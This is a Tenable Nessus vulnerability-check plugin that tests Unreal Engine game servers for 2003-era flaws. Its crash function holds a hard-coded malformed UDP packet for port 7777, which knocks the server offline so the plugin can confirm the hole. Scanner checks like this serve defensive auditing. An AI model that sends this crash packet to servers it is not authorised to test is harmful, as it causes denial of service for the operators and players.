#
# (C) Tenable Network Security, Inc.
#

#
# We simply crash the remote server (and only test for BID 6770, although
# everything should be corrected by the same patch). I don't really care
# because after all, it's just a game.
#

include("compat.inc");

if (description)
{
 script_id(11228);
 script_version("$Revision: 1.20 $");
 script_cvs_date("$Date: 2017/02/21 14:37:43 $");

 script_cve_id("CVE-2003-1430", "CVE-2003-1431", "CVE-2003-1432", "CVE-2003-1433");
 script_bugtraq_id(6770, 6771, 6772, 6773, 6774, 6775);
 script_osvdb_id(15397, 39607, 39608, 39609, 39610, 39611);

 script_name(english:"Unreal Engine Multiple Remote Vulnerabilities");
 script_summary(english:"Crashes the remote Unreal Engine Game Server");

 script_set_attribute(
  attribute:"synopsis",
  value:"The remote game server is affected by multiple vulnerabilities."
 );
 script_set_attribute(
  attribute:"description", 
  value:
"The Unreal Engine in use on the remote game server is vulnerable to
various attacks that may allow an attacker to use it as a distributed
denial of service source or to execute arbitrary code on this host. 

Note that Nessus appears to have disabled this service while testing
for these flaws."
 );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Feb/39");
 script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22, 94, 119, 189, 287);

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/02/05");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/02/12");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = 7777; # Only seen it on this port
if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

function ping()
{
local_var packet, r, soc;
packet = string("None", raw_string(0));
soc = open_sock_udp(port);
if ( ! soc ) return 0;
send(socket:soc, data:packet);
r = recv(socket:soc, length:4096);
if(r)return(1);
else return(0);
}


function crash()
{
local_var packet, r, soc;
packet = raw_string(
0x00,
0x80, 0x05, 0x20, 0x80, 0xe0, 0x04, 0x78, 0xaf,
0xf8, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40);

soc = open_sock_udp(port);
if ( ! soc ) return 0;
send(socket:soc, data:packet);
r = recv(socket:soc, length:4096);
if(r)return(1);
else return(0);
}


if(ping())
{
 crash();
 if(!ping())security_hole(port:port, proto:"udp");
}
